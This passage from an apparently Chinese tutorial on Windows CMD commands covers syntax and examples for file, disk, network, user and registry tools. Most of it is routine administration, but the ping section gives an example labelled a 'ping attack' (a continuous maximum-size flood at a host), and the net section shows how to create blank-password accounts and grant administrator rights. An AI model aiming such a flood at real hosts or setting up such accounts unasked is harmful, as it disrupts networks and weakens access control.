[.ext[=[fileType]]]</code></pre><ul><li>不带参数时，显示当前文件关联</li><li>.ext：指定跟文件类型关联的文件扩展名</li><li>fileType：指定跟文件扩展名关联的文件类型</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 显示当前文件关联assoc:: 修改扩展名为.wsz的关联类型为wszfileassoc .wsz=wszfile:: 显示文件扩展名为.txt的关联assoc .txt</code></pre><h4 id="bootcfg"><a href="#bootcfg" class="headerlink" title="bootcfg"></a>bootcfg</h4><p>​        用来在 BOOT.INI 文件中配置、查询、更改或删除启动项目设置。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">BOOTCFG /parameter [arguments]BOOTCFG /Copy [/S system [/U user [/P [password]]]] [/D description] /ID bootidBOOTCFG /Delete [/S system [/U user [/P [password]]]] /ID bootidBOOTCFG /Query [/S system [/U user [/P [password]]]]BOOTCFG /Raw osoptions [/S system [/U user [/P [password]]]] /ID bootid [/A]BOOTCFG /Timeout value [/S system [/U user [/P [password]]]]BOOTCFG /Default [/S system [/U user [/P [password]]]] /ID bootidBOOTCFG /Addsw [/S system [/U user [/P [password]]]]                   { [/MM val] [/BV] [/SO] [/NG] } /ID bootidBOOTCFG /Rmsw [/S system [/U user [/P [password]]]]                  { [/MM] [/BV] [/SO] [/NG] } /ID bootid</code></pre><ul><li>parameter：<ul><li>copy：生成一个现有启动项目的副本</li><li>delete：从BOOT.INI文件中删除现有的启动项</li><li>query：显示当前启动项目和它们的设置</li><li>/raw：允许用户指定要添加的任务任何开关</li><li>/timeout：允许用户更改超时值</li><li>/default：允许用户更改默认启动项目</li><li>/addsw：允许用户添加预定义开关</li><li>/rmsw：允许用户删除预定义开关</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 生成启动项目为“1”的副本bootcfg /copy /d "Windows With Debug" /ID 1:: 删除启动项目“1”bootcfg /delete /id 1:: 显示所有当前启动项目和设置bootcfg /query:: 在boot.ini文件中的操作系统目录"2"添加开关bootcfg /raw "/debug/sos" /a /id /2:: 将boot.ini文件中的超时值更改为“36”bootcfg /timeout 36:: 将boot.ini文件中的启动项目“2”设置为默认的启动项目bootcfg /default /id 2:: 为boot.ini文件中的启动项目“2”添加开关bootcfg /addsw /so /id 2:: 从boot.ini文件中删除启动项目“2”的开关bootcfg /rmsw /so /id 2</code></pre><h4 id="cacls"><a href="#cacls" class="headerlink" title="cacls"></a>cacls</h4><p>​        显示或者修改文件的访问控制列表(ACL)</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">CACLS filename [/T] [/M] [/L] [/S[:SDDL]] [/E] [/C] [/G user:perm]        [/R user [...]] [/P user:perm [...]] [/D user [...]]</code></pre><ul><li>/e：编辑 ACL 而不替换。</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 显示D:\demo\1.txt文件的访问控制列表cacls D:\demo\1.txt:: 编辑D:\demo\1.txt文件的ACLcacls D:\demo\1.txt /e</code></pre><h4 id="compact"><a href="#compact" class="headerlink" title="compact"></a>compact</h4><p>​        显示或改变 NTFS 分区上文件的压缩。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">COMPACT [/C | /U] [/S[:dir]] [/A] [/I] [/F] [/Q] [/EXE[:algorithm]]        [/CompactOs[:option] [/WinDir:dir]] [filename [...]]</code></pre><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 将D:\demo\1.txt文件压缩compact /c D:\demo\1.txt:: 将D:\demo\1.txt文件解压缩compact /u D:\demo\1.txt</code></pre><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>​        格式化磁盘</p><h4 id="label"><a href="#label" class="headerlink" title="label"></a>label</h4><p>​        用于创建、修改或删除磁盘卷标</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">label [f:备份分区]:: 将F驱动器设置为“备份分区”卷标</code></pre><h4 id="chkdsk"><a href="#chkdsk" class="headerlink" title="chkdsk"></a>chkdsk</h4><p>​        检查磁盘并显示状态报告</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">chkdsk [盘符] [文件路径] [/f] [/r] [/x] [/c]</code></pre><p><strong>说明</strong>：</p><ul><li>/f：修复磁盘上的错误（必须锁定磁盘）</li><li>/r：找到坏扇区并恢复可读取的信息（必须锁定磁盘）</li><li>/x：仅在NTFS上使用。如果必要，首先强制卸载卷。</li><li>/c：仅随NTFS使用。跳过文件夹结构中的周期检查，减少运行chkdsk所需的时间量</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">chkdsk D: /f:: 检查驱动器D，并修复错误</code></pre><h4 id="recover"><a href="#recover" class="headerlink" title="recover"></a>recover</h4><p>​        从损坏的磁盘中恢复可读取的信息。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">recover [盘符] [文件路径][文件名]</code></pre><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">recover D:/readme.txt:: 恢复驱动器D中的文件readme.txt</code></pre><h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>​        进行网络连接测试、名称解析</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ping [-t] [-a] [-n count] [-l length] [-f] [-i ttl] [-v tos] [-r count] [-s count] [-j -Host-list] | [-k Host-list] [-w timeout] destination-list </code></pre><ul><li>-t：向目的主机持续发送ICMP包，知道按下【Ctrl+C】才停止</li><li>-a：解析主机的NETBIOS主机名</li><li>-n count：定义用来测试所发出的ICMP包的个数，缺省值为4，其常被用来衡量网速</li><li>-l length：定义所发送缓冲区的数据包的大小，在默认情况下Windows的ping发送的数据包的大小为32Byte，使用该参数可以自己定义数据包的大小，但其最大限制为65500Byte，超出这个数时，接受方可能因为接受的数据包太大了死机，所以Microsoft为解决该安全漏洞限制了ping的数据包大小</li><li>-f：在数据包中设置“不要分段标识”，通常发送的数据包都会由路由分段再发送给接受方，使用该参数后路由不会进行分段操作</li><li>-i ttl：指定TTL值在对方系统里停留的时间</li><li>-v tos：将“服务类型”字段设置为“tos”指定的值</li><li>-r count：在“记录路由”字段中记录传出和返回数据包的路由。一般情况下你发送的数据包是通过一个个路由才到达对方的，但到底是经过了哪些路由呢？通过此参数就可以设定你想探测经过的路由的个数，不过限制在了9个，也就是说你只能跟踪到9个路由。</li><li>-s count：指定“count” 指定的跃点数的时间戳，此参数和-r差不多，只是这个参数不记录数据包返回所经过的路由，最多也只记录4个。</li><li>-j Host-list：利用“ computer-list” 指定的计算机列表路由数据包。连续计算机可以被中间网关分隔IP 允许的最大数量为 9。</li><li>-k Host-list：利用 “computer-list” 指定的计算机列表路由数据包。连续计算机不能被中间网关分隔IP 允许的最大数量为 9。</li><li>-w timeout：指定超时间隔，单位为毫秒。 </li><li>destination-list：是指要测试的主机名或IP地址或网址</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 连通测试ping 192.168.1.105:: 测试hosts文件ping localhost:: ping攻击(自定义数据的大小)ping -l 65500 -t 192.168.1.1:: 获取局域网计算机名称ping -a 192.168.1.1:: 获取网站的IP地址ping www.baidu.com:: 自定义检测数据包的数量ping -n 20 192.168.1.1</code></pre><h4 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h4><p>​        追踪ICMP包到达目标的路径</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout]               [-R] [-S srcaddr] [-4] [-6] target_name</code></pre><ul><li>target_name：追踪的目标（可以时IP地址也可以是网站）</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 检测到达百度服务器的路由是否存在故障tracert www.baidu.com</code></pre><h4 id="pathping"><a href="#pathping" class="headerlink" title="pathping"></a>pathping</h4><p>​        提供有关在来源和目标之间的中间跃点处的网络滞后和网络丢失的信息。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">pathping [-g host-list] [-h maximum_hops] [-i address] [-n]                [-p period] [-q num_queries] [-w timeout]                [-4] [-6] target_name</code></pre><ul><li>-n：不将地址解析成主机名</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 检测本机计算机到本地网关之间的路径pathping 192.168.1.1:: 检测远程计算机的路径pathping -n www.baidu.com</code></pre><h4 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h4><p>​        显示/修改TCP/IP设置</p><p><strong>语法</strong>:</p><pre class=" language-bat"><code class="language-bat">ipconfig [/all] [/renew [Adapter]] [/release [Adapter]] [/flushdns] [/displaydns] [/registerdns] [/showclassid Adapter] [/setclassid Adapter [ClassID]]</code></pre><ul><li>/all：显示所有适配器的完整 TCP/IP 配置信息。</li><li>/renew [Adapter]：更新所有适配器（如果未指定适配器），或特定适配器（如果包含了 Adapter 参数）的 DHCP 配置信息。</li><li>/release [Adapter]：发送 DHCPRELEASE 消息到 DHCP 服务器，以释放所有适配器（如果未指定适配器）或特定适配器（如果包含了 Adapter 参数）的当前 DHCP 配置并丢弃 IP 地址配置。该参数可以禁用配置为自动获取 IP 地址的适配器的 TCP/IP。</li><li>/registerdns：对 DNS 名称和 IP 地址的手工动态注册进行初始化。</li><li>/displaydns：显示 DNS 客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由计算机解析的名称查询而最近获得的任何资源记录。DNS 客户服务在查询配置的 DNS 服务器之前使用这些信息快速解析被频繁查询的名称。</li><li>/flushdns：清理并重设 DNS 客户解析器缓存的内容。如有必要，在 DNS 疑难解答期间，可以使用本过程从缓存中丢弃否定性缓存记录和任何其他动态添加的记录。</li><li>/showclassid Adapter：显示指定适配器的 DHCP 类别 ID。要查看所有适配器的 DHCP 类别 ID，可以使用星号 (*) 通配符代替 Adapter。该参数仅在具有配置为自动获取 IP 地址的网卡的计算机上可用。</li><li>/setclassid Adapter [ClassID]：配置特定适配器的 DHCP 类别 ID。要设置所有适配器的 DHCP 类别 ID，可以使用星号 (*) 通配符代替 Adapter。该参数仅在具有配置为自动获取 IP 地址的网卡的计算机上可用。如果未指定 DHCP 类别 ID，则会删除当前类别 ID。 </li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">ipconfig /all:: 显示详细的网络协议配置信息ipconfig /renew:: 更新IP地址ipconfig /registerdns:: 初始化网络配置ipconfig /displaydns:: 显示本地DNS信息ipconfig /flushdns:: 清除本地DNS缓存内容ipconfig /release:: 取消IP地址租用ipconfig /all > D:\ipconfigBak.txt:: 备份网络配置</code></pre><h4 id="getmac"><a href="#getmac" class="headerlink" title="getmac"></a>getmac</h4><p>​        显示计算机中网卡的媒体访问控制地址，即MAC地址</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">getmac [/S system]</code></pre><ul><li>/s <em>system</em>：查看局域网内主机的MAC地址及网络协议</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">getmac:: 显示本地网卡地址getmac /s 10.85.0.88 -u Administrator -p password:: 查看局域网内计算机网卡地址信息</code></pre><h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><p>​        显示活动的TCP连接、计算机侦听的端口、以太网统计信息、IP路由表等。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">netstat [-a] [-e] [-n] [-o] [-p proto] [-r] [-s]</code></pre><ul><li>-a：显示所有连接和侦听端口</li><li>-e：可以用来统计一些基本的网络流量</li><li>-n：显示数字化主机名，并且仅显示TCP连接</li><li>-r：显示关于路由表的信息，除了显示有效路由外还可显示当前有效的连接</li><li>-o：显示当前已建立的TCP连接状态的详细信息</li><li>-s：显示每个协议的统计信息</li><li>-p proto：显示proto指定的协议的连接，与-s一起使用时可显示每个协议的统计信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">netstat:: 显示网络连接情况netstat -n:: 显示数字化主机名，即IP地址；并且只显示TCP连接netstat -e:: 统计网络流量netstat -r:: 显示路由表信息netstat -o:: 查看当前活动的TCP连接信息netstat -a:: 查看当前所有活动的TCP连接以及侦听端口netstat -s -p tcp:: 查看本机所有TCP连接情况netstat -s -p udp:: 查看本机所有UDP连接情况netstat -s -p icmp:: 查看本机所有ICMP连接情况netstat -s -p ip:: 查看本机所有IP连接情况netstat -o 8:: 显示当前活动的TCP连接和进行ID，以后每隔8s会自动显示当前活动的TCP连接的PID进程</code></pre><h4 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h4><p>​        显示、修改IP-MAC映射列表</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ARP -s inet_addr eth_addr [if_addr]ARP -d inet_addr [if_addr]ARP -a [inet_addr] [-N if_addr] [-v]</code></pre><ul><li>a：显示本地计算机上所有接口的ARP缓存表信息</li><li>-s inet_addr eth_addr：将IP地址与网卡地址绑定</li><li>-d inet_addr：解除IP地址与网卡的绑定</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">arp -a:: 显示本地计算机所有接口的ARP缓存表arp -s 192.168.1.105 00-26-18-27-4A-8A:: 将IP地址192.168.1.105与MAC地址00-26-18-27-4A-8A绑定arp -d 192.168.1.105:: 解除IP地址192.168.1.105与网卡的绑定arp -d:: 解除所有IP地址与网卡的绑定</code></pre><h4 id="route"><a href="#route" class="headerlink" title="route"></a>route</h4><p>​        操作网络路由表</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ROUTE [-f] [-p] [-4|-6] command [destination]                  [MASK netmask]  [gateway] [METRIC metric]  [IF interface]</code></pre><ul><li><em>command</em>：对路由表的操作命令<ul><li>print：打印路由</li><li>add：添加路由</li><li>delete：删除路由</li><li>change：修改现有路由</li></ul></li><li>-p：添加永久路由</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">route print:: 显示完整的IP路由表route print 192.*:: 显示IP路由表以“192.”开始的路由信息route add 0.0.0.0 mask 0.0.0.0 192.168.1.1:: 添加192.168.1.1所在的网关为默认路由项route -p add 192.168.1.12 mask 255.255.255.255 192.168.2.1:: 添加一条到192.168.1.12的永久路由</code></pre><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>​        显示可用来诊断域名系统（DNS）基础结构的信息。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">nslookup [-opt ...]             # 使用默认服务器的交互模式nslookup [-opt ...] - server    # 使用 "server" 的交互模式nslookup [-opt ...] host        # 仅查找使用默认服务器的 "host"nslookup [-opt ...] host server # 仅查找使用 "server" 的 "host"</code></pre><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 检测DNS服务器nslookup www.baidu.com</code></pre><h4 id="nbtstat"><a href="#nbtstat" class="headerlink" title="nbtstat"></a>nbtstat</h4><p>​        显示协议统计和当前使用 NBI 的 TCP/IP 连接</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n]        [-r] [-R] [-RR] [-s] [-S] [interval] ]</code></pre><ul><li>-a：列出指定名称的远程机器的名称表</li><li>-A：列出指定IP的远程机器的名称表</li><li>-R：清除和重新加载远程缓存名称表</li><li>-RR：将名称释放包发送到WINS，然后启动刷新</li><li>-S：列出具有目标IP地址的会话表</li></ul><p><strong>eg</strong>:</p><pre class=" language-bat"><code class="language-bat">:: 探测对方计算机名称nbtstat -a 192.168.1.1:: 清除NetBIOS名称缓存信息，重新加载Lmhosts文件nbtstat -R:: 重新注册NetBIOS名称nbtstat -RR:: 统计NetBIOS会话信息,(每5秒统计一次)nbtstat -S 5</code></pre><h4 id="net"><a href="#net" class="headerlink" title="net"></a>net</h4><p>​        网络命令集及用户管理</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">NET    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |      STATISTICS | STOP | TIME | USE | USER | VIEW ]</code></pre><ul><li>view：查看局域网中运行的客户端</li><li>share：用于共享资源的管理、添加、删除以及查看局域网中的共享资源等</li><li>user：用于用户账户的管理、添加、删除等</li><li>statistics：主要用于显示本地工作站或服务器的统计记录</li><li>config：查看本地计算机上可配置的服务</li><li>localgroup：用于本地组的查看、管理等</li><li>session：计算机的会话操作</li><li>accounts：用户账户设置</li><li>time：用于查询、设定计算机的时间服务器</li><li>start：主要用于启动服务</li><li>stop：主要用于停止服务</li><li>pause：主要用于暂停服务</li><li>continue：主要用于重新激活当前暂停的服务</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 查看指定计算机的共享资源net view 192.168.1.105:: 查看局域网中正在运行的客户端net view:: 查看所有共享net share:: 设置ipc共享net share ipc:: 删除ipc共享net share ipc /del:: 设置C盘为共享net share C$=C::: 共享资源设置共享名注释net share 重要内部资源=D:\download /remark:'未经允许不得将资源外传':: 设置资源访问人数（最大访问人数为：8）net share 重要内部资源 /user:8:: 设置自动缓存方式net share 重要内部资料 /cache:automatic:: 禁止共享目录使用自动缓存net share 重要内部资料 /cache:no:: 查看本地的用户列表net user:: 添加一个用户net user 用户名 密码 /add:: 添加一个密码为空的用户net user 用户名 [""] /add:: 删除某个用户net user 用户名 /del:: 设置某个用户的状态为启用(禁用)net user 用户名 active:yes(no):: 禁止用户自行更改密码net user 用户名 /passwordchg:no:: 设置账户的主目录net user 用户名 /homedir:D\用户名:: 设置用户账户密码的最少字符数为：6net accounts /minpwlen:6:: 强制用户在4天内更改密码，且不允许8天内不更改密码net accounts /minpwage:4 /maxpwage:8:: 避免用户使用旧密码(强制用户不能使用8个历史记录内的密码)net accounts /uniquepw:8:: 查看计算机本地组列表net localgroup :: 查看管理员组里的用户net localgroup administrators:: 把某个用户添加到管理员组net localgroup administrators 用户名 /add:: 从管理员组中删除某个用户net localgroup administrators 用户名 /del- 添加到某个组里的用户必须时已经被创建过的用户- 添加的组必须为已存在的组:: 查看本地计算机上的统计服务net statistics:: 查看本地服务器服务的统计信息net statistics server:: 查看本地工作站服务统计信息net statistics workstation:: 查看本地计算机上可配置的服务net config:: 查看本机服务器上可配置的服务net config server:: 查看本地工作站上的配置服务net config workstation:: 在局域网中隐藏本地计算机net config server /hidden:yes:: 设置空闲会话时间(默认为15分钟，设置为-1则表示永远不中断用户连接)net config server /autodisconnect:8:: 设置本地计算机与网络中名为jackson-pc的计算机时间同步net time \\jackson-pc /set:: 断开计算机的会话操作net session /delete:: 查看已经启动的服务列表net start:: 开启某个服务（开启成功的前提时服务被停用而不是禁用）net start 服务名:: 停止某个服务（停止的服务必须是已经启动的）net stop 服务名:: 启动自动更新服务net start wuauserv:: 启动迟后打印服务net start spooler:: 启动时间管理服务net start "windows time":: 暂停服务器服务net pause server:: 激活服务器服务net continue server</code></pre><h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><p>​        文件传输</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">FTP [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [-b:asyncbuffers] [-w:windowsize] [host]</code></pre><ul><li>-A：匿名登录</li><li>-v：禁止显示远程服务器响应</li><li>-w:windowsize：覆盖默认的传输缓冲区大小</li><li>-a：在绑字数据连接时使用所有本地接口</li><li>-n：禁止在初始连接时自动登录</li><li>-g： 禁用文件名通配</li><li>-i：关闭多文件传输过程中的交互提示</li><li>-d：启动调试</li><li>-s:filename：指定包含 FTP 命令的文本文件；命令在 FTP 启动后自动运行</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 登录远程的FTP服务器fpt 192.168.1.12:: 匿名登录远程的FTP服务器ftp -A 192.168.1.12:: 屏蔽FTP服务器信息ftp -v 192.168.1.12:: 设置文件传输缓存大小为8092Bftp -w:8092 192.168.1.12:: 设置数据连接使用任何网络接口ftp -a 192.168.1.12:: 设置连接后禁止自动登录ftp -n 192.168.1.12:: 禁止使用文件通配符(默认ftp命令操作本地文件时允许使用通配符)ftp -g -A 192.168.1.12:: 屏蔽文件传输时的交互提示信息（默认在多个文件传输时会提示每个文件的传输信息）ftp -i -A 192.168.1.12:: 查看命令执行的详细信息(默认不显示执行命令的详细信息)ftp -d -A 192.168.1.12:: 登录后自动执行指定的(command.txt文件内的ftp命令)命令ftp -s:D:\command.txt -A 192.168.1.12------------------------------------------------------FTP子命令:: 使用该用户建立与192.168.1.12:21服务器的连接open 192.168.1.12 21:: 断开与远程服务器的连接close:: 断开与远程服务器的连接disconnect:: 退出FTP程序quit:: 退出FTP程序bye:: 切换命令行状态ftp         ::进入FTP程序!           ::切换到DOS模式下exit / ftp  :: 再次返回FTP程序中:: 设置文件传输模式(二进制 / ASCII文本)type binary / ascii:: 设置传输结束提示音bell:: 禁用通配符glob:: 查看命令执行状态status:: 创建远程文件夹demomkdir demo:: 更改服务器的当前目录(进入demo目录下)cd demo:: 设置FTP工作目录lcd D:\demo:: 查看远程目录列表dir :: 将远程目录列表保存到文件dir . dirlist.txt:: 显示远程目录列表mls - -:: 上传文件put 1.jpg:: 重命名远程文件rename 1.jpg one.jpg:: 下载服务器文件get one.jpg:: 删除远程文件delete one.jpg:: 删除远程文件夹rmdir demo:: 关闭文件传输询问方式prompt:: 禁止显示服务器响应信息verbose:: 切换用户登录user:: 显示函数调用序列(一次命令执行一次跟踪)trace</code></pre><h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>​        远程登录</p><h4 id="msg"><a href="#msg" class="headerlink" title="msg"></a>msg</h4><p>​        给用户发送消息</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">MSG {username | sessionname | sessionid | @filename | *}    [/SERVER:servername] [/TIME:seconds] [/V] [/W] [message]</code></pre><ul><li>username：标识指定的用户名</li><li>sessionname：会话名称</li><li>sessionid：会话ID</li><li>@filename：识别这样一个文件，该文件含有将所有消息发送到用户名、会话名和会话标识号的列表</li><li>*：给指定服务器上的所有会话发送消息</li><li>/SERVER:servername：要联系的服务器（默认是当前值）</li><li>/TIME:seconds：等待接收器确认消息的时间延迟</li><li>/V：显示有关执行的操作的信息</li><li>/W：等待用户的响应，跟/V一起使用</li><li>message：要发送的消息。如果没有指定会发出提示或者冲stdin读取</li></ul><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p>​        显示或修改系统日期</p><h4 id="time"><a href="#time" class="headerlink" title="time"></a>time</h4><p>​        显示或修改系统时间</p><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><p>​        安排在特定日期和时间运行命令和程序</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>​        立即或定时关闭或重启计算机</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">shutdown [-i]{[-s] | [-r] | [-I]} [-f] [-t time] [-c "消息内容"]</code></pre><ul><li>-i：显示图形用户界面，但必须是shutdown的第一项</li><li>-s：关闭计算机</li><li>-r：重新启动计算机</li><li>-I：注销当前用户</li><li>-f：强制关闭正在运行的应用程序，不在前台警告用户</li><li>-t time：后跟等待秒数，为0则表示马上重启</li><li>-c “消息内容”：输入关机对话框中的消息内容（不能超过127个字符）</li></ul><h4 id="taskkill"><a href="#taskkill" class="headerlink" title="taskkill"></a>taskkill</h4><p>​        结束进程</p><h4 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h4><p>​        显示进程列表</p><h4 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h4><p>​        对注册表子项信息和注册表项值中的值执行添加、更改、导入、导出以及其他操作</p><h5 id="reg-add"><a href="#reg-add" class="headerlink" title="reg add"></a>reg add</h5><p>​        将新的子项或项添加到注册表中</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Add KeyName [{/v ValueName | /ve}] [/t DataType] [/s Separator] [/d Data] [/f]</code></pre><ul><li>KeyName：指定要添加的子项或项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>/v ValueName：指定要添加到指定子项下的注册表项名称。</li><li>/ve：指定添加到注册表中的注册表项为空值。</li><li>/t DataType： 指定注册表项的类型。Type 必须是以下几种类型之一：<ul><li>Reg_SZ</li><li>Reg_MULTI_SZ</li><li>Reg_DWORD_BIG_ENDIAN</li><li>Reg_DWORD</li><li>Reg_BINARY</li><li>Reg_DWORD_LITTLE_ENDIAN</li><li>Reg_LINK</li><li>Reg_FULL_RESOURCE_DESCRIPTOR</li><li>Reg_EXPAND_SZ</li></ul></li><li>/s Separator：  当指定了 Reg_MULTI_SZ 数据类型并且需要列出多个项时，指定用来分隔数据的多个实例的字符。如果没有指定，将使用默认分隔符“\0”。</li><li>/d Data： 指定新注册表项的数据。</li><li>/f：添加注册表项而不要求确认。</li></ul><p><strong>注</strong>：</p><ul><li>该操作不能添加子树。该版本的 Reg 在添加子项时无需请求确认。</li><li>Reg Add 操作的返回值是0代表成功，是1代表失败。</li><li>对于 Reg_EXPAND_SZ 项类型，在 /d 参数内将插入符号 ( ^ ) 与“%”一起使用。</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要在远程计算机 ABC 上添加 HKLM\Software\MyCo 项，请键入：Reg ADD \\ABC\HKLM\Software\MyCo:: 要将一个注册表项添加到 HKLM\Software\MyCo，选项为值名：Data；类型：Reg_BINARY；数值数据：fe340ead；请键入：Reg ADD HKLM\Software\MyCo /v Data /t Reg_BINARY /d fe340ead:: 要将一个多值注册表项添加到 HKLM\Software\MyCo，选项为值名：MRU；数据类型：Reg_MULTI_SZ；数值数据：fax\0mail\0\0；请键入： Reg ADD HKLM\Software\MyCo /v MRU /t Reg_MULTI_SZ /d fax\0mail\0\0:: 要将一个扩展的注册表项添加到 HKLM\Software\MyCo，选项为值名：Path；数据类型：Reg_EXPAND_SZ；数值数据：%systemroot%；请键入：Reg ADD HKLM\Software\MyCo /v Path /t Reg_EXPAND_SZ /d ^%systemroot^%</code></pre><h5 id="reg-compare"><a href="#reg-compare" class="headerlink" title="reg compare"></a>reg compare</h5><p>​        比较指定的注册表子项或项</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Compare KeyName1 KeyName2 [{/v ValueName | /ve}] [{/oa | /od | /os | /on}] [/s]</code></pre><ul><li>KeyName1：指定要比较的第一个子项的完整路径。要指定远程计算机，请包括计算机名（以\\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是 HKLM 和 HKU。</li><li>KeyName2：指定要比较的第二个子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略 \\ComputerName\ 会导致默认对本地计算机的操作。只在 KeyName2 中指定计算机名会导致该操作使用到 KeyName1 中指定的子项的路径。KeyName 必须包括一个有效的根键。有效根键包括 HKLM、HKCU、HKCR、HKU 以及 HKCC。如果指定了远程计算机，则有效根键是HKLM和HKU。</li><li>/v ValueName：指定要比较的子项下的值名称。</li><li>/ve： 指定只比较值名称为 null 的项。</li><li>/oa：指定显示所有不同点和匹配点。默认情况下，仅列出不同点。</li><li>/od：指定仅显示不同点。这是默认操作。</li><li>/os：指定仅显示匹配点。默认情况下，仅列出不同点。</li><li>/on：指定不显示任何内容。默认情况下，仅列出不同点。</li><li>/s：递归地比较所有子项和项。</li></ul><p><strong>注</strong>：</p><ul><li>reg compare操作的返回值<ul><li>0：比较成功且结果相同</li><li>1：比较失败</li><li>2：比较成功并找到不同点</li></ul></li><li>结果中显示的符号<ul><li><code>=</code>：KeyName1数据等于KeyName2数据</li><li><code>&lt;</code>：KeyName1数据小于KeyName2数据</li><li><code>&gt;</code>：KeyName1数据大于于KeyName2数据</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 要将 MyApp 项下的所有值与 SaveMyApp 项下的所有值进行比较，请键入：Reg COMPARE HKLM\Software\MyCo\MyApp HKLM\Software\MyCo\SaveMyApp:: 要比较 MyCo 项下的 Version 的值和 MyCo1 项下的 Version 的值，请键入：Reg COMPARE HKLM\Software\MyCo HKLM\Software\MyCo1 /v Version:: 要将计算机 ZODIAC 上 HKLM\Software\MyCo 下的所有子项和值与当前计算机上 HKLM\Software\MyCo 下的所有子项和值进行比较，请键入： Reg COMPARE \\ZODIAC\HKLM\Software\MyCo \\. /s</code></pre><h5 id="reg-copy"><a href="#reg-copy" class="headerlink" title="reg copy"></a>reg copy</h5><p>​        将一个注册表项复制到本地或远程计算机的指定位置</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">Reg Copy KeyName1 KeyName2 [/s] [/f] </code></pre><ul><li>KeyName1：指定要复制子项的完整路径。要指定远程计算机，请包括计算机名（以 \\ComputerName\ 格式表示），并将其作为 KeyName 的一部分。省略\\ComputerName\ 